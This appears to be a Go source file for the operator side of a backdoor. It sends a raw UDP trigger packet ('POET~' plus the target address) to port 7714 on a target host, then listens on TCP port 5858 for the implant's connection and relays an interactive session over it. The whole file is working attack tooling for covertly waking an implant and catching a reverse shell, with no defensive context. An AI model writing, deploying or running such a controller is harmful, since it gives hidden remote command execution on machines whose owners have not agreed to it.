package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// quill logo

func GetInterfaceIpv4Addr(interfaceName string) (addr string, err error) {
	var (
		ief      *net.Interface
		addrs    []net.Addr
		ipv4Addr net.IP
	)
	if ief, err = net.InterfaceByName(interfaceName); err != nil { // get interface
		return
	}
	if addrs, err = ief.Addrs(); err != nil { // get addresses
		return
	}
	for _, addr := range addrs { // get ipv4 address
		if ipv4Addr = addr.(*net.IPNet).IP.To4(); ipv4Addr != nil {
			break
		}
	}
	if ipv4Addr == nil {
		return "", errors.New(fmt.Sprintf("interface %s don't have an ipv4 address\n", interfaceName))
	}
	return ipv4Addr.String(), nil
}

func open(ifName string) (net.PacketConn, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return nil, fmt.Errorf("Failed open socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW): %s", err)
	}
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	if ifName != "" {
		_, err := net.InterfaceByName(ifName)
		if err != nil {
			return nil, fmt.Errorf("Failed to find interface: %s: %s", ifName, err)
		}
		syscall.SetsockoptString(fd, syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, ifName)
	}

	conn, err := net.FilePacketConn(os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd)))
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func buildUDPPacket(dst, src *net.UDPAddr, command string) ([]byte, error) {
	buffer := gopacket.NewSerializeBuffer()
	payload := gopacket.Payload(command)
	ip := &layers.IPv4{
		DstIP:    dst.IP,
		SrcIP:    src.IP,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: layers.UDPPort(src.Port),
		DstPort: layers.UDPPort(dst.Port),
	}
	if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
		return nil, fmt.Errorf("Failed calc checksum: %s", err)
	}
	if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}, ip, udp, payload); err != nil {
		return nil, fmt.Errorf("Failed serialize packet: %s", err)
	}
	return buffer.Bytes(), nil
}

func sendUDPPacket(iFace string, source string, target string, command string, sport int, dport int) {
	conn, err := open(iFace)
	if err != nil {
		panic(err)
	}
	dst := &net.UDPAddr{
		IP:   net.ParseIP(target),
		Port: dport,
	}
	fmt.Printf("Data: %s\n", command)
	b, err := buildUDPPacket(dst, &net.UDPAddr{IP: net.ParseIP(source), Port: sport}, command)
	if err != nil {
		panic(err)
	}
	_, err = conn.WriteTo(b, &net.IPAddr{IP: dst.IP})
	if err != nil {
		panic(err)
	}

	return
}

func tcp_con_handle(con net.Conn) {
	chan_to_stdout := stream_copy(con, os.Stdout)
	chan_to_remote := stream_copy(os.Stdin, con)
	select {
	case <-chan_to_stdout:
		log.Println("Remote connection is closed")
	case <-chan_to_remote:
		log.Println("Local program is terminated")
	}
}

// Performs copy operation between streams: os and tcp streams
func stream_copy(src io.Reader, dst io.Writer) <-chan int {
	buf := make([]byte, 1024)
	sync_channel := make(chan int)
	go func() {
		defer func() {
			if con, ok := dst.(net.Conn); ok {
				con.Close()
				log.Printf("Connection from %v is closed\n", con.RemoteAddr())
			}
			sync_channel <- 0 // Notify that processing is finished
		}()
		for {
			var nBytes int
			var err error
			nBytes, err = src.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Printf("Read error: %s\n", err)
				}
				break
			}
			_, err = dst.Write(buf[0:nBytes])
			if err != nil {
				log.Fatalf("Write error: %s\n", err)
			}
		}
	}()
	return sync_channel
}

func main() {
	var iFace string
	var source string
	var target string

	iFace, ok := os.LookupEnv("IFACE")
	if !ok {
		fmt.Printf("IFACE environment variable not set\n")
		return
	}

	flag.StringVar(&target, "t", "127.0.0.1", "IP address to target")

	flag.Parse()

	if target == "127.0.0.1" {
		flag.Usage()
		return
	}

	source, err := GetInterfaceIpv4Addr(iFace)
	if err != nil {
		panic(err)
		return
	}

	opener := "POET~" + target
	sendUDPPacket(iFace, source, target, opener, 77, 7714)

	listener, err := net.Listen("tcp", source+":5858") // TODO change port
	if err != nil {
		log.Fatalln(err)
	}

	con, err := listener.Accept()
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Connect from", con.RemoteAddr())

	tcp_con_handle(con)
}
